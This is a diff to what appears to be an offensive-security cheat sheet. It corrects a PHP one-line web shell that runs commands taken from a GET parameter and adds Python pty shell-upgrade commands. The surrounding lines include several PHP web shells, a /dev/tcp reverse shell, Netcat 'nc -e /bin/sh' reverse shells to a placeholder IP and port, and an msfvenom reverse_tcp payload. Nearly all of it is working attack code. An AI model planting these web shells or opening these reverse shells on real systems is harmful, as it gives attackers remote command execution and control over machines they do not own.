@@ -32,7 +32,7 @@ Basic PHP code to execute system commands through GET parameters:
 
 ```php
 <?php if($_GET['cmd']) { system($_GET['cmd']); } ?>
-<?php if($_GET['cmd']) { exec($_GET['cmd']),$array); print_r($array); } ?>
+<?php if($_GET['cmd']) { exec($_GET['cmd'],$array); print_r($array); } ?>
 <?php if($_GET['cmd']) { echo shell_exec($_GET['cmd']); } ?>
 <?php if($_GET['cmd']) { echo passsthru($_GET['cmd']); } ?>
 <?php if($_GET['cmd']) { preg_replace('/.*/e', $_GET['cmd'], ''); } ?>
@@ -121,7 +121,7 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 
 ###### Netcat
 
-```bash
+```
 # If nc e option available:
 nc -e /bin/sh <IP> <PORT> &
 nc.exe -e cmd.exe <IP> <PORT>
@@ -255,7 +255,9 @@ msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT
 echo os.system('/bin/bash')
 
 # Python
+python -c 'import pty; pty.spawn("/bin/bash")'
 python -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/sh")'
 
 # Perl
